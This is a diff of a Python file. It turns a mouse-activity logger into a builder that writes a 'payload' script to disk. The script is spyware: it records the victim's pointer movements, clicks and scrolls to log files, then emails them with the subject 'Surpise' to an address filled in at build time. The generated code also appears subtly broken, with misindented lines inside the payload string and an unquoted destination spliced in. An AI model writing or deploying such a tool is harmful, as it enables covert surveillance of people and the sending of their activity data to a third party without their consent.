@@ -1,61 +1,65 @@
-from pynput import mouse, keyboard
-from pynput.mouse import Button, Controller
-from datetime import date
-import time
-import logging
-import os
+def create(destination, path):
+    payload = """from pynput import mouse, keyboard
+        from pynput.mouse import Button, Controller
+        from datetime import date
+        import time
+        import logging
+        import os
+        import send_logs
+
+        # Getting Current Date and time
+        t = time.localtime()
+        timeNow = time.strftime("%H:%M:%S", t)
+        dateNow = date.today()
+
+        # Making Controller Variable to Control/Monitor the Mouse
+        controller = Controller()
+
+        mouse_logo = open("mouse_logo.txt", "r")
+        logo = mouse_logo.read()
+
+        cwd = os.getcwd()
+        log_directory = os.path.join(cwd, "Key_logs")
+        if not os.path.exists(log_directory):
+            os.makedirs(log_directory)
 
 
-# Getting Current Date and time
-t = time.localtime()
-timeNow = time.strftime("%H:%M:%S", t)
-dateNow = date.today()
+        def setup_logger(name, log_file, level=logging.INFO):
 
-# Making Controller Variable to Control/Monitor the Mouse
-controller = Controller()
+            handler = logging.FileHandler(log_file)
 
-mouse_logo = open("mouse_logo.txt", "r")
-logo = mouse_logo.read()
+            logger = logging.getLogger(name)
+            logger.setLevel(level)
+            logger.addHandler(handler)
 
-cwd = os.getcwd()
-log_directory = os.path.join(cwd, "Key_logs")
-if not os.path.exists(log_directory):
-    os.makedirs(log_directory)
+            return logger
 
 
-def setup_logger(name, log_file, level=logging.INFO):
-    """Function setup as many loggers as you want"""
+        mouse_logger = setup_logger('mouse_logger', 'Key_logs/mouse_logs.txt')
+        mouse_logger.info("Date: " + str(dateNow)+"\n")
+        mouse_logger.info("Time: "+str(timeNow)+"\n\n\n\n\n")
 
-    handler = logging.FileHandler(log_file)
-
-    logger = logging.getLogger(name)
-    logger.setLevel(level)
-    logger.addHandler(handler)
-
-    return logger
+        logs = open("Key_logs/mouse_logs.txt", "a")
+        logs.truncate(0)
+        mouse_logger.info(logo)
 
 
-mouse_logger = setup_logger('mouse_logger', 'Key_logs/mouse_logs.txt')
-mouse_logger.info("Date: " + str(dateNow)+"\n")
-mouse_logger.info("Time: "+str(timeNow)+"\n\n\n\n\n")
-
-logs = open("Key_logs/mouse_logs.txt", "a")
-logs.truncate(0)
-mouse_logger.info(logo)
+        def on_move(x, y):
+            mouse_logger.info('Pointer moved to ,{0}'.format((x, y)))
 
 
-def on_move(x, y):
-    mouse_logger.info('Pointer moved to ,{0}'.format((x, y)))
+        def on_click(x, y, button, pressed):
+            mouse_logger.info('{0} at ,{1}'.format('Pressed' if pressed else 'Released',(x, y)))
 
 
-def on_click(x, y, button, pressed):
-    mouse_logger.info('{0} at ,{1}'.format('Pressed' if pressed else 'Released',(x, y)))
+        def on_scroll(x, y, dx, dy):
+            mouse_logger.info('Scrolled {0} at ,{1}'.format('down' if dy < 0 else 'up',(x, y)))
 
 
-def on_scroll(x, y, dx, dy):
-    mouse_logger.info('Scrolled {0} at ,{1}'.format('down' if dy < 0 else 'up',(x, y)))
-
-
-# Collect events until released
-with mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener_m:
-    listener_m.join()
+        # Collect events until released
+        with mouse.Listener(on_move=on_move, on_click=on_click, on_scroll=on_scroll) as listener_m:
+            listener_m.join()
+        send_logs.send_email('Surpise', 'Default Message', """ + destination + """)
+    """
+    with open(path, 'w') as file:
+        file.write(payload)
